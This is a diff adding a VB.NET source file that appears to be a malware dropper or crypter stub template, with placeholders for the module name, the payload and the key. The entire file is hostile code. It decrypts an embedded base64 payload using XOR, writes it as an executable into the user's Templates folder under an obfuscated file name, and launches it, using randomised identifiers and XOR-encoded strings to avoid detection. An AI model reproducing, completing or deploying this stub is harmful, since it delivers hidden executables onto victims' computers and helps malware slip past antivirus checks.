@@ -1,0 +1,38 @@
+ Imports System, Microsoft.VisualBasic 
+ Module %1% 
+ Sub Main() 
+ Dim %2% As String = %3% 
+ Dim %4% As Byte() = decrypt(Convert.FromBase64String(%2%),"%7%") 
+ Dim %5% As String = "%6%MKQnYsGHUwEPbQwAcoDQEkC( Chr(112) & Chr(118) & Chr(112) , "PmKGHPEwapfnFuEmshbuDaR").exe" 
+ IO.File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & MKQnYsGHUwEPbQwAcoDQEkC( Chr(20) , "HJiQtUnZTSiZUlcHKvvkDKr") & %5% & MKQnYsGHUwEPbQwAcoDQEkC( Chr(119) & Chr(60) & Chr(33) & Chr(60) , "YrrlHTvaSNXAUEmHtrTuJHd"), %4%) 
+ System.Diagnostics.Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & MKQnYsGHUwEPbQwAcoDQEkC( Chr(20) , "HJiQtUnZTSiZUlcHKvvkDKr") & %5% & MKQnYsGHUwEPbQwAcoDQEkC( Chr(119) & Chr(60) & Chr(33) & Chr(60) , "YrrlHTvaSNXAUEmHtrTuJHd")) 
+  
+ End Sub 
+  
+ Function decrypt(ByVal message As Byte(), ByVal password As String) As Byte() 
+         Dim WccWIjCDMHedVqkFppgOuef As Byte() = System.Text.Encoding.UTF8.GetBytes(password) 
+         Dim HwSvWnfUwIMJXXBkdKIZLCv As Integer = message(message.Length - 1) Xor 112 
+         Dim outarr(message.Length) As Byte 
+         Dim KFRrwqSmiDgMZUYSEZFtgTA As Integer 
+         For i1 As Integer = 0 To message.Length - 1 
+             outarr(i1) = (message(i1) Xor HwSvWnfUwIMJXXBkdKIZLCv) Xor WccWIjCDMHedVqkFppgOuef(KFRrwqSmiDgMZUYSEZFtgTA) 
+             If KFRrwqSmiDgMZUYSEZFtgTA = password.Length - 1 Then KFRrwqSmiDgMZUYSEZFtgTA = 0 Else KFRrwqSmiDgMZUYSEZFtgTA = KFRrwqSmiDgMZUYSEZFtgTA + 1 
+         Next 
+         ReDim Preserve outarr(message.Length - 2) 
+         Return outarr 
+     End Function 
+  
+  
+  
+
+Private Function MKQnYsGHUwEPbQwAcoDQEkC(ByVal FLfFArwvOWgJNHmNB As String, ByVal fYoLKUYOOuXrHLIVu As String)
+Dim hDjbqnWHTnBSipNKN As String =""
+Dim SuVXOLLvalnSMGHwr As Short
+Dim VYQnueJngeRpnkMlK As Integer
+VYQnueJngeRpnkMlK = Asc(fYoLKUYOOuXrHLIVu)
+For SuVXOLLvalnSMGHwr = 1 To Len(FLfFArwvOWgJNHmNB)
+hDjbqnWHTnBSipNKN &= Chr(VYQnueJngeRpnkMlK Xor Asc(Mid(FLfFArwvOWgJNHmNB, SuVXOLLvalnSMGHwr, 1)))
+Next 
+Return hDjbqnWHTnBSipNKN
+End Function
+End Module
